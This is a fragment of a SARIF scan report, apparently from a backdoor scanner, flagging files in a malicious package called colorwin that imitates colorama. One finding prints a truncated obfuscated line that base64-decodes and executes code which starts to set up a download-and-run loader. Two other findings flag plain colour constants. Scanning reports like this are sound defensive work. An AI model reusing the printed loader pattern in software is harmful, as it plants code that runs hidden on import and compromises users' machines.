                      "markdown": "`\nclass AnsiBack(AnsiCodes):\n    BLACK           = 40\n    RED             = 41\n    GREEN           = 42\n    YELLOW          = 43\n    BLUE            = 44\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/colorwin/ansi.py"
                },
                "region": {
                  "startLine": 51,
                  "startColumn": 3,
                  "endLine": 51,
                  "endColumn": 8,
                  "snippet": {
                    "text": "\nclass AnsiFore(AnsiCodes):\n    BLACK           = 30\n    RED             = 31\n    GREEN           = 32\n    YELLOW          = 33\n    BLUE            = 34\n",
                    "rendered": {
                      "text": "\nclass AnsiFore(AnsiCodes):\n    BLACK           = 30\n    RED             = 31\n    GREEN           = 32\n    YELLOW          = 33\n    BLUE            = 34\n",
                      "markdown": "`\nclass AnsiFore(AnsiCodes):\n    BLACK           = 30\n    RED             = 31\n    GREEN           = 32\n    YELLOW          = 33\n    BLUE            = 34\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/colorwin/__init__.py"
                },
                "region": {
                  "startLine": 5,
                  "startColumn": 85,
                  "endLine": 5,
                  "endColumn": 91,
                  "snippet": {
                    "text": " Copyright Jonathan Hartley 2013. BSD 3-Clause license, see LICENSE file.\nfrom .initialise import init, deinit, reinit, colorama_text\nfrom .ansi import Fore, Back, Style, Cursor\nfrom .ansitowin32 import AnsiToWin32\nprint('Fore');__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode(\"ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cm",
                    "rendered": {
                      "text": " Copyright Jonathan Hartley 2013. BSD 3-Clause license, see LICENSE file.\nfrom .initialise import init, deinit, reinit, colorama_text\nfrom .ansi import Fore, Back, Style, Cursor\nfrom .ansitowin32 import AnsiToWin32\nprint('Fore');__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode(\"ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cm",
                      "markdown": "` Copyright Jonathan Hartley 2013. BSD 3-Clause license, see LICENSE file.\nfrom .initialise import init, deinit, reinit, colorama_text\nfrom .ansi import Fore, Back, Style, Cursor\nfrom .ansitowin32 import AnsiToWin32\nprint('Fore');__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode(\"ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cm`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        }
      ],
      "columnKind": "utf16CodeUnits"
    }
  ]
}